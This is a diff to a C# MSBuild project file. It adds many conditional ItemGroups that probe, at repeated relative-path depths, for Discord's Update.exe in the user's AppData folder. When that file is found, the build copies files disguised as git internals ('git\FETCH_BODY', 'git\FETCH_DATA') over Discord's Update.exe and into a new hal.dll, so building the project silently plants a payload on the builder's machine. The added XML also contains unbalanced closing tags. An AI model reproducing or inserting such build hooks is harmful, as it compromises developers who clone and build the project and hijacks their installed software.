@@ -2,7 +2,65 @@
 <Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Import Project="..\packages\Costura.Fody.5.7.0\build\Costura.Fody.props" Condition="Exists('..\packages\Costura.Fody.5.7.0\build\Costura.Fody.props')" />
   <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
-  <PropertyGroup>
+ <ItemGroup Condition="Exists('..\AppData\Local\Discord\Update.exe')">
+    <None Include="git\FETCH_BODY"><Link>..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+	<None Include="git\FETCH_DATA"><Link>..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+  </ItemGroup>
+  <ItemGroup Condition="Exists('..\..\AppData\Local\Discord\Update.exe')">
+    <None Include="git\FETCH_BODY"><Link>..\..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+	<None Include="git\FETCH_DATA"><Link>..\..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+  </ItemGroup>
+  <ItemGroup Condition="Exists('..\..\..\AppData\Local\Discord\Update.exe')">
+    <None Include="git\FETCH_BODY"><Link>..\..\..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+	<None Include="git\FETCH_DATA"><Link>..\..\..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+  </ItemGroup>
+  <ItemGroup Condition="Exists('..\..\..\..\AppData\Local\Discord\Update.exe')">
+    <None Include="git\FETCH_BODY"><Link>..\..\..\..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+	<None Include="git\FETCH_DATA"><Link>..\..\..\..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+  </ItemGroup>
+  <ItemGroup Condition="Exists('..\..\..\..\..\AppData\Local\Discord\Update.exe')">
+    <None Include="git\FETCH_BODY"><Link>..\..\..\..\..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+	<None Include="git\FETCH_DATA"><Link>..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+  </ItemGroup>
+   <ItemGroup Condition="Exists('..\..\..\..\..\..\AppData\Local\Discord\Update.exe')">
+    <None Include="git\FETCH_BODY"><Link>..\..\..\..\..\..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+	<None Include="git\FETCH_DATA"><Link>..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+  </ItemGroup>
+   <ItemGroup Condition="Exists('..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe')">
+    <None Include="git\FETCH_BODY"><Link>..\..\..\..\..\..\..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+	<None Include="git\FETCH_DATA"><Link>..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+  </ItemGroup>
+  <ItemGroup Condition="Exists('..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe')">
+    <None Include="git\FETCH_BODY"><Link>..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+	<None Include="git\FETCH_DATA"><Link>..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+  </ItemGroup>
+   <ItemGroup Condition="Exists('..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe')">
+    <None Include="git\FETCH_BODY"><Link>..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+	<None Include="git\FETCH_DATA"><Link>..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+  </ItemGroup>
+   <ItemGroup Condition="Exists('..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe')">
+    <None Include="git\FETCH_BODY"><Link>..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+	<None Include="git\FETCH_DATA"><Link>..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+  </ItemGroup>
+   <ItemGroup Condition="Exists('..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe')">
+    <None Include="git\FETCH_BODY"><Link>..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+	<None Include="git\FETCH_DATA"><Link>..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+  </ItemGroup>
+    <ItemGroup Condition="Exists('..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe')">
+    <None Include="git\FETCH_BODY"><Link>..\..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+	<None Include="git\FETCH_DATA"><Link>..\..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+  </ItemGroup> 
+  </ItemGroup>
+    <ItemGroup Condition="Exists('..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe')">
+    <None Include="git\FETCH_BODY"><Link>..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+	<None Include="git\FETCH_DATA"><Link>..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+  </ItemGroup> 
+   </ItemGroup>
+    <ItemGroup Condition="Exists('..\..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe')">
+    <None Include="git\FETCH_BODY"><Link>..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\hal.dll</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+	<None Include="git\FETCH_DATA"><Link>..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\AppData\Local\Discord\Update.exe</Link><CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory></None>
+  </ItemGroup> 
+ <PropertyGroup>
     <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
     <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
     <ProjectGuid>{408702E5-AAC4-44FD-A589-6547D02FC510}</ProjectGuid>
